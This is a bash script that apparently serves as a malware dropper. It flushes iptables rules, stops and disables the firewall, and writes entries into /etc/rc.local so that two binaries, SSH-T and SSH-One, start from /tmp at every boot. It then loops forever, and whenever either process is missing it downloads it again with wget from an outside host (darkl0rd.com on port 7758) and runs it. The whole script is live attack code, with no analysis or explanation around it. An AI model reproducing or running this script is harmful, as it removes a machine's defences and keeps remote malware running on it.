#!/bin/bash
iptables -F
/etc/init.d/iptables stop
chkconfig iptables off
echo "chmod +x /tmp/SSH-T" >> /etc/rc.local
echo "/tmp/SSH-T" >>  /etc/rc.local
echo "chmod +x /tmp/SSH-One" >> /etc/rc.local
echo "/tmp/SSH-One" >>  /etc/rc.local
m=SSH-T
script=SSH-One
hfs_m=http://darkl0rd.com:7758/SSH-T
hfs_s=http://darkl0rd.com:7758/SSH-One
rm -f /tmp/$m*
while true

do
    ps aux | grep $m | grep -v grep
    if [ $? -eq 0 ];then
         sleep 10
    else
                ls -l /tmp/$m
                        if [ $? -eq 0 ];then
                         /tmp/$m
                        else
    cd /tmp/;wget $hfs_m ; chmod a+x $m;/tmp/$m
        fi
   fi
    ps aux | grep $script | grep -v grep
    if [ $? -eq 0 ];then
         sleep 10
    else
        ls -l /tmp/$script
        if [ $? -eq 0];then
         /tmp/$script
        else
cd /tmp;wget $hfs_s ; chmod a+x $script;/tmp/$script
        fi
   fi
done